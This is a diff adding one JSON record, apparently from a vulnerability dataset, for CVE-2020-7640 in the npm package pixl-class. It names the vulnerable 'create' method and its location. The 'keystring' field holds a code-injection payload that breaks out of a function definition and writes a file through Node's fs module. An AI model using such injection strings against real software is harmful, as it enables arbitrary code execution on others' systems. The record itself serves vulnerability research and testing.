@@ -1,0 +1,8 @@
+{
+    "id": "CVE-2020-7640",
+    "upstream": "pixl-class@1.0.0",
+    "keymethod": "create",
+    "keystring": "function(){}; require(\"fs\").writeFileSync(\"./pixl-class\",\"\"); //}",
+    "location": "class.js:26:4",
+    "downstreams": []
+}
